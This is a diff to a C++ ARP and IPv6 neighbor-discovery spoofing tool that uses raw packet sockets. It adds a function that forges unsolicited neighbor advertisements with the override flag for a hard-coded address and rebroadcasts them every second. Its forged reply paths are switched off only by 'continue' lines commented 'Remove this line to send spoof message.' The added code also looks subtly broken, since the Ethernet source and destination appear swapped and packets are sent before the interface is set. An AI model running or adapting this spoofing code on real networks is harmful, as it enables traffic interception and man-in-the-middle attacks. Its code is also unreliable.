@@ -90,16 +90,16 @@ bool ARPSpoof::HWAddress(const char* const ifname, uint8_t* const hw_address)
 
 void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
 {
-    uint8_t HWAddr[ETHER_ADDR_LEN] = {0};
-
     if(ifname == nullptr)
     {
         return;
     }
 
-    while(HWAddress(ifname, HWAddr) == false);
-    while(setsockopt(m_RxSockets[IPV4], SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname)) != 0);
-    while(setsockopt(m_RxSockets[IPV6], SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname)) != 0);
+    m_IfName = std::string(ifname);
+
+    while(HWAddress(m_IfName.c_str(), HWAddr) == false);
+    while(setsockopt(m_RxSockets[IPV4], SOL_SOCKET, SO_BINDTODEVICE, m_IfName.c_str(), strlen(m_IfName.c_str())) != 0);
+    while(setsockopt(m_RxSockets[IPV6], SOL_SOCKET, SO_BINDTODEVICE, m_IfName.c_str(), strlen(m_IfName.c_str())) != 0);
     
     timeval rx_to = {1, 0};
     fd_set ReadFD;
@@ -131,7 +131,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
             {
                 continue;
             }
-            continue;
+            continue;// Remove this line to send spoof message.
             // make reply packet;
             // ethernet header
             memcpy(TxEthHdr->ether_dhost, RxEthHdr->ether_shost, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
@@ -149,7 +149,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
             memcpy(TxARPHdr->arp_tpa, RxARPHdr->arp_spa, IP_ADDR_LEN);// set target IP address of the reply packet with the source IP address of the request packet.
             // sockaddr_ll
             memset(&ifaddr, 0, sizeof(ifaddr));
-            ifaddr.sll_ifindex = if_nametoindex(ifname); //Interface number
+            ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
             ifaddr.sll_family = AF_PACKET;
             memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
             ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
@@ -195,6 +195,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
                     std::cout<<"Checksum error"<<std::endl;
                     continue;
                 }
+                continue;// Remove this line to send spoof message.
                 std::cout<<"ICMP Type "<<0+NeighborSolicit->nd_ns_type<<std::endl;
                 std::cout<<"ICMP Code "<<0+NeighborSolicit->nd_ns_code<<std::endl;
                 std::cout<<"ICMP CKS "<<0+NeighborSolicit->nd_ns_cksum<<std::endl;
@@ -246,7 +247,7 @@ void ARPSpoof::DoARPSpoof(const char *ifname, const char *filename)
                     TxNeighborAdvert->nd_na_cksum = ICMPChecksum(TxIPv6Hdr);
                     
                     memset(&ifaddr, 0, sizeof(ifaddr));
-                    ifaddr.sll_ifindex = if_nametoindex(ifname); //Interface number
+                    ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
                     ifaddr.sll_family = AF_PACKET;
                     memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
                     ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
@@ -305,15 +306,73 @@ uint16_t ARPSpoof::ICMPChecksum(void* IP6Hdr)
     return htons((~sum));
 }
 
+void ARPSpoof::SendNeighborAdvertisement()
+{
+    const unsigned char BroadcastHWAddr[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    const unsigned char TargetIPAddress[] =   {0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                                               0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};
+    const unsigned char AllNodeMulticastIPAddress[] =   {0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                                                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
+    ether_header* const TxEthHdr       = (ether_header*)      (m_TxBuffer);
+    ip6_hdr* const TxIPv6Hdr           = (ip6_hdr*)           (m_TxBuffer+sizeof(ether_header));
+    nd_neighbor_advert* const TxNeighborAdvert = (nd_neighbor_advert*)(m_TxBuffer+sizeof(ether_header)+sizeof(ip6_hdr));
+    ICMPOptionLinkLayerAddress* const TxLinkLayerAddress = (ICMPOptionLinkLayerAddress*)(m_TxBuffer+sizeof(ether_header)+sizeof(ip6_hdr)+sizeof(nd_neighbor_advert));
+    sockaddr_ll ifaddr;
+
+    memset(m_TxBuffer, 0, sizeof(m_TxBuffer));
+
+    memcpy(TxEthHdr->ether_dhost, HWAddr, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
+    memcpy(TxEthHdr->ether_shost, BroadcastHWAddr, ETHER_ADDR_LEN);
+    TxEthHdr->ether_type = htons(ETH_P_IPV6);
+
+    TxIPv6Hdr->ip6_vfc  |= (0x60 & 0xf0);
+    TxIPv6Hdr->ip6_plen |= htons(sizeof(nd_neighbor_advert)+sizeof(ICMPOptionLinkLayerAddress));
+    TxIPv6Hdr->ip6_nxt  |= 58;
+    TxIPv6Hdr->ip6_hops |= 255;
+    memcpy(&TxIPv6Hdr->ip6_src, TargetIPAddress, 16);
+    memcpy(&TxIPv6Hdr->ip6_dst, AllNodeMulticastIPAddress, 16);
+
+    TxNeighborAdvert->nd_na_type = ND_NEIGHBOR_ADVERT;
+    TxNeighborAdvert->nd_na_code = 0;
+    TxNeighborAdvert->nd_na_cksum = 0;
+    TxNeighborAdvert->nd_na_flags_reserved = ND_NA_FLAG_OVERRIDE;
+    memcpy(&TxNeighborAdvert->nd_na_target, TargetIPAddress, 16);
+    TxLinkLayerAddress->Type = Target_Link_Layer_Address;
+    TxLinkLayerAddress->Length = 1;
+    memcpy(TxLinkLayerAddress->Address, HWAddr, 6);
+    // Calcuate Checksum
+    TxNeighborAdvert->nd_na_cksum = ICMPChecksum(TxIPv6Hdr);
+
+    memset(&ifaddr, 0, sizeof(ifaddr));
+    ifaddr.sll_ifindex = if_nametoindex(m_IfName.c_str()); //Interface number
+    ifaddr.sll_family = AF_PACKET;
+    memcpy(ifaddr.sll_addr, HWAddr, ETHER_ADDR_LEN); //Physical layer address
+    ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address
+
+    if((int)(sizeof(ether_header)+sizeof(ip6_hdr)+ntohs(TxIPv6Hdr->ip6_plen)) != 
+        sendto(m_TxSocket, m_TxBuffer, sizeof(ether_header)+sizeof(ip6_hdr)+ntohs(TxIPv6Hdr->ip6_plen), 0, (struct sockaddr *)&ifaddr, sizeof(ifaddr)))
+    {
+        std::cout<<"Cannot send NDP spoofing message"<<std::endl;
+    }
+
+    std::cout<<"SendNeighborAdvertisement"<<std::endl;
+    ARPSpoof* const self = this;
+    while(false == m_Timer.ScheduleTask(1000, [self](){
+        self->SendNeighborAdvertisement();
+    }));
+}
+
 ARPSpoof::ARPSpoof()
 {
     while((m_RxSockets[IPV4] = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0);
     while((m_RxSockets[IPV6] = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_IPV6))) < 0);
     while((m_TxSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0);
+	SendNeighborAdvertisement();
 }
 
 ARPSpoof::~ARPSpoof()
 {
+	m_Timer.Stop();
     close(m_RxSockets[IPV6]);
     close(m_RxSockets[IPV4]);
     close(m_TxSocket);
